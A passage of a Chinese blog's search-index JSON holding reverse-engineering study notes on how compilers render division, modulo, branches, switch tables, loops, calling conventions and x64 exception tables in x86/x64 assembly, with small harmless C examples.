(2 ^ 32 - M), 向上取整 MagicNumber为负 int main(int argc, char* argv[]) { printf(\"argc / -10 = %lld\", (long long)argc / -10); system(\"pause\"); return 0; } 特征 x \u003e= 0: x / 除数 = x * M64 \u003e\u003e (64 + n) x \u003c 0: x / 除数 = ((x * M64) \u003e\u003e (64 + n)) + 1) 总结 除数 = 2 ^ (64 + n) / (2 ^ 64 - M64), 向上取整 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:11:2","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"总结 x / 除数 = x * M \u003e\u003e (32 + n) 结论: M \u003e 0: x / 正除数, 除数 = 2 ^ (32 + n) / M, 向上取整 M \u003c 0: x / 负除数, 除数 = 2 ^ (32 + n) / (2 ^ 32 - M ), 向上取整 x / 除数 = (x * M + x) \u003e\u003e (32 + n) 结论: M \u003c 0: x / 正除数, 除数 = 2 ^ (32 + n) / M, 向上取整 x / 除数 = (x * M - x) \u003e\u003e (32 + n) 结论: M \u003e 0: x / 负除数, 除数 = 2 ^ (32 + n) / (2 ^ 32 - M ), 向上取整 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:11:3","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"取模 余数的符号与被除数相同. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:12:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基本公式 商 = 被除数 / 除数 余数 = 被除数 - 商 * 除数 int main(int argc, char* argv[]) { printf(\"argc % 3 = %d\", argc % 3); system(\"pause\"); return 0; } Release ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:12:1","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无符号模2的幂 int main(int argc, char* argv[]) { printf(\"%d\", (unsigned)argc % 4); system(\"pause\"); return 0; } Release 特征 x % (2 ^ n) = x \u0026 (2 ^ n - 1) ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:12:2","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"有符号模2的幂 优化1: int main(int argc, char* argv[]) { printf(\"%d\", argc % 4); system(\"pause\"); return 0; } Release 优化二: int main(int argc, char* argv[]) { printf(\"%lld\\n\", argc % 512); system(\"pause\"); return 0; } Release mov rax, [rsp+28h+arg_8] lea rcx, aLld_0 ; \"%lld\\n\" cqo and edx, 511 add rax, rdx and eax, 511 sub rax, rdx mov rdx, rax call sub_1400011F0 特征 x \u003e 0: x % (2 ^ n) = x \u0026 (2 ^ n - 1) x \u003c 0: x % (2 ^ n) = ((x + (2 ^ n - 1) \u0026 (2 ^ n - 1)) - (2 ^ n - 1) ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:12:3","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++逆向 64位程序,只能通过函数内是否有虚表,判断是否是构造函数. 判断继承: 构造函数中,调父类构造,且同一位置,写两次虚表. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:13:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"异常 为了解决频繁注册注销SEH,直接将异常表做好,当发生异常时,系统就会去.pdata节,找异常表..pdata节中的数据按RUNTIME_FUNCTION这个结构体进行解析(里面的地址是RVA). 00000000 RUNTIME_FUNCTION struc; (sizeof = 0xC, mappedto_5) 00000000 FunctionStart dd ? ; offset rva 00000004 FunctionEnd dd ? ; offset rva pastend 00000008 UnwindInfo dd ? ; offset rva 0000000C RUNTIME_FUNCTION ends ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:0","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"UNWIND_INFO结构体 typedef struct _UNWIND_INFO { UBYTE Version : 3; UBYTE Flags : 5; UBYTE SizeOfProlog; UBYTE CountOfCodes; UBYTE FrameRegister : 4; UBYTE FrameOffset : 4; UNWIND_CODE UnwindCode[1]; /* UNWIND_CODE MoreUnwindCode[((CountOfCodes + 1) \u0026 ~1) - 1]; * union { * OPTIONAL ULONG ExceptionHandler; * OPTIONAL ULONG FunctionEntry; //异常处理函数RVA, 可有可无,看Flag * }; * OPTIONAL ULONG ExceptionData[]; */ //FunctionInfo的RVA } UNWIND_INFO, *PUNWIND_INFO; //Flag #define UNW_FLAG_NHANDLER 0x0 #define UNW_FLAG_EHANDLER 0x1 //置位, 说明有一个C++异常回调函数 #define UNW_FLAG_UHANDLER 0x2 //置位, 说明有一个C异常回调函数 #define UNW_FLAG_CHAININFO 0x4 00000000 UNWIND_INFO_HDR struc; (sizeof = 0x4, mappedto_6) 00000000 Ver3_Flags db ? ; base 16 00000001 PrologSize db ? ; base 16 00000002 CntUnwindCodes db ? ; base 16 00000003 FrReg_FrRegOff db ? ; base 16 00000004 UNWIND_INFO_HDR ends ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:1","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"UNWIND_CODE结构体 typedef union _UNWIND_CODE { struct { UBYTE CodeOffset; UBYTE UnwindOp : 4; UBYTE OpInfo : 4; }; USHORT FrameOffset; } UNWIND_CODE, *PUNWIND_CODE; 00000000 UNWIND_CODE struc; (sizeof = 0x2, mappedto_7) 00000000 PrologOff db ? ; base 16 00000001 OpCode_OpInfo db ? ; base 16 00000002 UNWIND_CODE ends ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:2","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"定位Catch代码块 int main(int argc, char* argv[]) { try { if (argc == 1) { throw 1; } else { throw 3.14; } } catch (int nVal) { printf(\"catch (int nVal) %d\\r\\n\", nVal); } catch (double dbl) { printf(\"catch (double dbl) %lf\\r\\n\", dbl); } system(\"pause\"); return 0; } 定位有异常处理函数的RUNTIME_FUNCTION结构. 定位UNWIND_INFO结构体. 定位FuncInfo结构体. 根据异常关系信息表,定位Catch代码块. 接下来的故事,就跟32位中,定位Catch代码块的步骤一样了. 注意 __CxxFrameHandler3 兼容之前的SEH异常处理,参数是FuncInfo的结构体指针. __CxxFrameHandler4 更新版本的SEH异常处理,参数是FuncInfo4的结构体指针,在ehdata4_export.h头文件定义. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:3","tags":["Windows"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"除法 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"约定 两个无符号相除,结果仍然是无符号. 两个有符号相除,结果是有符号. 有符号数和无符号数混除,结果是无符号的. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基本概念 在C语言和其他多数高级语言中,对整数除法规定为向零取整. 向下取整 取得往负无穷方向接近x的整数值. 向下取整的除法,当除数为2的幂时,可以直接用带符号右移指令(sar)来完成. 但是,向下取整存在一个问题: $$ ⌊\\frac{-a}{b}⌋ \\not= -⌊\\frac{a}{b}⌋ (假设\\frac{a}{b}结果不为整数) $$ 向上取整 取得往正无穷方向接近x的整数值. 向上取整也存在一个问题: $$ ⌈\\frac{-a}{b}⌉ \\not= -⌈\\frac{a}{b}⌉ (假设\\frac{a}{b}结果不为整数) $$ 向零取整 取得往0方向最接近x的整数值. 向零取整的除法满足: $$ [\\frac{-a}{b}] = [\\frac{a}{-b}] =-[\\frac{a}{b}] $$ ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无符号除法 除数为变量 除数为变量的时候是没有优化,只能使用除法指令,这里的变量是指类似argc这类在编译期间不能计算的变量. int main(unsigned int argc, char* argv[]) { printf(\"%d \\r\\n\", 10 / argc); return 0; } 除数为2的幂 int main(unsigned int argc, char* argv[]) { printf(\"%d\", argc / 4); return 0; } 除数为非2的幂 MagicNumber无进位 int main(unsigned int argc, char* argv[]) { printf(\"%d \\r\\n\", argc / 3); return 0; } 推导 特征 mov eax, MagicNumber mul 被除数 shr edx, n ;这条指令可无 还原 除数 = 2^(32 + n) / MagicNumber 结果向上取整 MagicNumber有进位 int main(unsigned int argc, char* argv[]) { printf(\"%d\", argc / 7); return 0; } 推导 特征 #乘减移加移 mov reg, 被除数 mov eax, MagicNumber mul reg sub reg, edx shr reg, 1 add reg, edx shr reg, A; 这句可能没有 ;此后直接使用reg的值, eax弃而不用 还原 统计右移次数,n = 32 + 1 + A 除数 = 2^n / (2^32 + MagicNumber) 结果向上取整 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"有符号除法 除数为正2的幂 int main(int argc, char* argv[]) { printf(\"%d \\r\\n\", argc / 8); return 0; } 推导 特征 mov eax, 被除数 cdq and edx, 2 ^ n - 1 add eax, edx sar eax, n 还原 除数 = 2^n 除数为正非2的幂 MagicNumber为正 int main(int argc, char* argv[]) { printf(\"%d \\r\\n\", argc / 5); return 0; } 推导 特征 mov reg, 被除数 mov eax, MagicNumber ;(MagicNumber \u003c= 0x7FFFFFFF) imul reg sar edx, n ;没有这条指令则指数为32 mov reg, edx shr reg, 1Fh add edx, reg ;此后直接使用edx的值 MagicNumber为正 乘法和移位之间无调整 还原 除数 = 2^(32 + n) / MagicNumber 结果向上取整 MagicNumber为负 int main(int argc, char* argv[]) { printf(\"%d\", argc / 73); return 0; } 推导 在16位机器上计算无符号数0x8086与有符号数A,保证计算结果正确. 0x8086用imul指令会被当做负数,用补码进行计算 计算机计算= - ~0x8086 * A = - (0x10000 - 0x8086) * A =(0x8086 - 0x10000) * A =0x8086 * A - 0x10000 * A 而我们想要得到0x8086 * A,故计算出来的结果应加上0x10000 * A 对应上图中的add edx, ecx 特征 mov reg, 被除数 mov eax, MagicNumber ;(MagicNumber \u003e 7FFFFFFFh) imul reg add edx, reg sar edx, n ;没有这条指令则指数为32 mov reg, edx shr reg, 1Fh add edx, reg ;此后直接使用edx的值 MagicNumber为负 乘法和移位之间有加调整 还原 除数 = 2^(32 + n) / MagicNumber 结果向上取整 除数为负2的幂 int main(int argc, char* argv[]) { printf(\"%d\", argc / -8); return 0; } 推导 特征 mov eax, 被除数 cdq and edx, 2^n - 1 add eax, edx sar eax, n neg eax 还原 除数 = - 2^n 除数为负非2的幂 MagicNumber为正 int main(int argc, char* argv[]) { printf(\"%d\", argc / -73); return 0; } 推导 在16位机器上计算无符号数0x8086与有符号数A,保证计算结果正确. 0x8086用imul指令会被当做负数,用补码进行计算 计算机计算= - ~0x8086 * A = - (0x10000 - 0x8086) * A =(0x8086 - 0x10000) * A =0x8086 * A - 0x10000 * A 假设上面0x8086为MagicNumber 我们的MagicNumber为正,故-0x8086假定是MagicNumber 所以上面的计算机计算结果应加上符号,变为 -(0x8086 * A - 0x10000 * A) =-0x8086 * A + 0x10000 * A 但我们想得到-0x8086 * A，故应再加上0x10000 * A 对应上图中的sub edx, ecx 特征 mov reg, 被除数 mov eax, MagicNumber imul reg sub edx, reg sar edx, n ;没有这句, 指数为32 mov reg, edx shr reg, 1Fh add edx, eax ;此后使用edx的值 MagicNumber为正 乘法和移位之间有减调整 还原 先将MagicNumber求补(取反+1)拿到原来的MagicNumbeSrc 除数的绝对值 = 2^(32 + n) /MagicNumberSrc 结果向上取整 除数为负 由于MagicNumber为正,故求补得到的MagicNumberSrc为负 注意参与计算的MagicNumSrc应当做无符号数进行计算 本例中MagicNumber = 0x1F8FC7E3 MagicNumberSrc = 0xE070381D, 对应的无符号十进制数为3765450781 故除数的绝对值 = 2^38 / 3765450781 结果向上取整为73 再添加负号就还原了除数为-73 MagicNumber为负 int main(int argc, char* argv[]) { printf(\"%d\", argc / -5); return 0; } 推导 A/(-C),C\u003e0 -\u003e -A * M \u003e\u003e n -\u003e A * -M \u003e\u003e n 故汇编显示的MagicNumber为原来MagicNumber求补后的结果. 特征 mov reg, 被除数 mov eax, MagicNumber imul reg sar edx, n ;没有这句, 指数为32 mov reg, edx shr reg, 1Fh add edx, reg ;此后使用edx的值 MagicNumber为负 乘法和移位之间没有调整 还原 先将MagicNumber求补(取反+1)拿到原来的MagicNumbeSrc 除数的绝对值 = 2^(32 + n) /MagicNumberSrc 结果向上取整 除数为负 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:4","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"取模 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:2:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基础 模的符号与被除数相同. 除数为变量,无优化,只有当除数为常量时,才有优化空间. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:2:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无符号取模 除数为2的幂 int main(unsigned int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % 8); return 0; } 推导 对2的n次方取模,实际上是取该数值的二进制低n位 如10进制中,321%100,我们取321的低2位,就可以知道余数为21 特征 mov reg, 被除数 and reg, 2 ^ n - 1 还原 除数 = 2^n 除数为非2的幂 int main(unsigned int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % 7); return 0; } 推导 余数 = 被除数 - 商 * 除数 还原 可以通过上面的除法部分得到除数 也可以通过中间商乘以除数的部分得到除数 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:2:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"有符号取模 除数为正2的幂 带分支 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % 8); return 0; } 推导 mov eax, [esp+argc] ;将被除数给eax and eax, 80000007h ;取被除数的符号位和低n位 jns short loc_401010 ;如果被除数为正,跳走,直接使用eax dec eax ;处理负数取模为0的情况 减1后为全f,如果取模不为0的情况是不需要dec和inc指令 or eax, 0FFFFFFF8h ;被除数为负,需要将模的结果高位填补为1 inc eax ;处理负数取模为0的情况 上面减后全为f,此处加1,调整为0 loc_401010: ;使用eax 特征 mov reg, 被除数 and reg, 0x8000000(2^n - 1) jns LABLE dec reg or reg, 0xFFFFFFF(2^n) inc reg LABLE: ;使用reg 还原 除数 = 2^n 不带分支 见除数为负2的幂. 除数为正非2的幂 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % 7); return 0; } 推导 余数 = 被除数 - 商 * 除数 还原 可以通过上面的除法部分得到除数 也可以通过中间商乘以除数的部分得到除数 除数为负2的幂 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % -8); return 0; } 推导 对2的n次方取模,实际上是取该数值的二进制低n位 模的符号与被除数相同 还原 上图中的7为2^n - 1 除数 = 2^n 除数为负非2的幂 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % -7); return 0; } 推导 余数 = 被除数 - 商 * 除数 还原 可以通过上面的除法部分得到除数 也可以通过中间商乘以除数的部分得到除数 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:2:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"三目运算 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:3:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基础 表达式1 ? 表达式2 : 表达式3,只有当表达式2和表达式3为常量时,才可以优化,否则和if分支语句产生的代码一样. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:3:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"低版本优化 原型: int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc == 0 ? 0 : -1); return 0; } 特征 mov reg, 表达式1中的第1项值 neg reg sbb reg, reg 演变1: int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc == 100 ? 6 : 2); return 0; } 特征 mov reg,表达式1第一项值 sub reg, 表达式1第二项值 neg reg sbb reg, reg and rl, 表达式3-表达式2 add reg, 表达式2 演变2: int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc \u003e 100 ? 2 : 6); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:3:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"高版本优化 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc \u003e= 100 ? 5 : 2); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:3:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"流程控制语句 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:4:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"IF 单分支结构 int main(int argc, char* argv[]) { if (argc \u003e 10) { printf(\"argc \u003e 10\\r\\n\"); } return 0; } 特征 IF_BEGIN jxx IF_END . . ;中间为条件体 . ;注意语句上面无跳转 IF_END 双分支结构 代码外提: int main(int argc, char* argv[]) { if (argc \u003e 10) { printf(\"argc \u003e 10\\r\\n\"); } else { printf(\"argc \u003c= 10\\r\\n\"); } system(\"pause\"); return 0; } 特征 IF_BEGIN jxx ELSE_BEGIN ... IF_END jmp ELSE_END ELSE_BEGIN ... ELSE_END 代码内提: int main(int argc, char* argv[]) { if (argc \u003e 10) { printf(\"argc \u003e 10\\r\\n\"); } else { printf(\"argc \u003c= 10\\r\\n\"); } return 0; } 多分支结构 int main(int argc, char* argv[]) { if (argc \u003e 10) { printf(\"argc \u003e 10\\r\\n\"); } else if (argc \u003c 10) { printf(\"argc \u003c 10\\r\\n\"); } else { printf(\"argc == 10\\r\\n\"); } system(\"pause\"); return 0; } 特征 IF_BEGIN jxx ELSE_IF_BEGIN ... IF_END jmp ELSE_END ELSE_IF_BEGIN jxx ELSE_BEGIN ... ELSE_IF_END jmp ELSE_END ELSE_BEGIN ... ELSE_END ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:4:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"SwitchCase Case语句\u003c=3 int main(int argc, char* argv[]) { switch (argc) { case 0: printf(\"argc == 0\\r\\n\"); case 1: printf(\"argc == 1\\r\\n\"); break; case 2: printf(\"argc == 2\\r\\n\"); break; default: printf(\"default\\r\\n\"); } system(\"pause\"); return 0; } Debug Release 特征 一个个比较,中间无代码块 这样的话,匹配跳转成功时,没有break语句会继续向下执行 case语句\u003e3,且每两个Case值之间的差值\u003c=6 int main(int argc, char* argv[]) { switch (argc) { case 0: printf(\"argc == 0\\r\\n\"); case 1: printf(\"argc == 1\\r\\n\"); break; case 2: printf(\"argc == 2\\r\\n\"); break; case 8: printf(\"argc == 8\\r\\n\"); break; default: printf(\"default\\r\\n\"); } system(\"pause\"); return 0; } Debug Release 特征 编译器会给所有case情况做一个表 当提供的序号大于最大索引时,直接跳转到DEFAULT或SWITCH_END case语句\u003e3,最大case值-最小case值\u003c=255 int main(int argc, char* argv[]) { switch (argc) { case 0: printf(\"argc == 0\\r\\n\"); case 46: printf(\"argc == 46\\r\\n\"); break; case 55: printf(\"argc == 55\\r\\n\"); break; case 77: printf(\"argc == 77\\r\\n\"); break; default: printf(\"default\\r\\n\"); } system(\"pause\"); return 0; } Debug Release 特征 编译器会生成两个表 下标表:记录对应case地址表的下标 case地址表:记录case语句块的地址 还原 case语句\u003e3,最大case值-最小case值\u003e255 int main(int argc, char* argv[]) { switch (argc) { case 0: printf(\"argc == 0\\r\\n\"); case 46: printf(\"argc == 46\\r\\n\"); break; case 555: printf(\"argc == 555\\r\\n\"); break; case 777: printf(\"argc == 777\\r\\n\"); break; case 888: printf(\"argc == 888\\r\\n\"); break; default: printf(\"default\\r\\n\"); } system(\"pause\"); return 0; } Debug Release 特征 二分优化 注意:会进行二分优化和前面三种混合优化 注意 break语句,对应的跳转一定是跳向SWITCH_END. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:4:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"循环语句 DoWhile int main(int argc, char* argv[]) { int nSum = 0; int n = 1; do { nSum += n; n++; } while (n \u003c= 100); printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } Debug Release 特征 Do_Begin ... ... ... jxx Do_Begin Do_End While int main(int argc, char* argv[]) { int nSum = 0; while (argc \u003c= 100) { nSum += argc; argc++; } printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } Debug 特征 While_Begin jxx While_End ... ... ... jmp While_Begin While_End Release 特征 这个地方While循环会被优化成DoWhile循环 多了一个跳转提前进行判断 注意:跳转的判定条件和循环的判定条件具有相关性时,才可还原为While循环 For int main(int argc, char* argv[]) { int nSum = 0; for (int i = 0; i \u003c= 100; i++) { nSum += i; } printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } Debug 特征 For_Init ... jmp For_Cmp For_Step ... For_Cmp jxx For_End For_Body ... ... jmp For_Step For_End Release 特征 被优化为DoWhile循环 注意 //Break语句 循环语句中,跳转循环体,可识别为break语句 //Continue语句 Release版,经常会将Continue语句优化为If_Else双分支结构 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:4:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"函数调用方式 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:5:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"_cdecl C\\C++默认的调用方式 调用方平栈 参数:从右到左以此入栈 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:5:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"_stdcall 被调方平栈 参数:从右到左以此入栈 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:5:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"_fastcall 被调方平栈 参数:前两个参数由寄存器传递(VS编译器用edx, ecx),其余参数通过堆栈传递 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:5:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"变量相关 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"全局变量 特征: 所在地址为数据区,生命周期与所在模块一致. 使用立即数访问. 全局变量初始化: int foo() { return 1234; } int g_nTest = foo(); int main(int argc, char* argv[]) { printf(\"g_nTest = %d\\r\\n\", g_nTest); system(\"pause\"); return 0; } 定位初始化位置 注意:高版本_cinit函数被内联了. 使用交叉引用 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"局部变量 特征: 所在地址为栈区,生命周期与所在的函数作用域一致. 使用ebp或esp间接访问. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"局部静态变量 C++语法规定局部静态变量只被初始化一次. int main(int argc, char* argv[]) { static float f = 3.14f / argc; printf(\"f = %f\\r\\n\", f); system(\"pause\"); return 0; } VC6.0Release版 高版本(如VS2019)将这个标志位放到了Tls中. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:3","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"堆变量 在C\\C++中,使用malloc与new实现堆空间的申请. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:6:4","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"X87浮点指令集 VC6.0 ~ VS2013. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:0","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"特征 使用80位浮点协处理器处理浮点运算. 浮点协处理器内部为栈结构. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:1","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"运算过程 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:7:2","tags":["Windows"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"指令 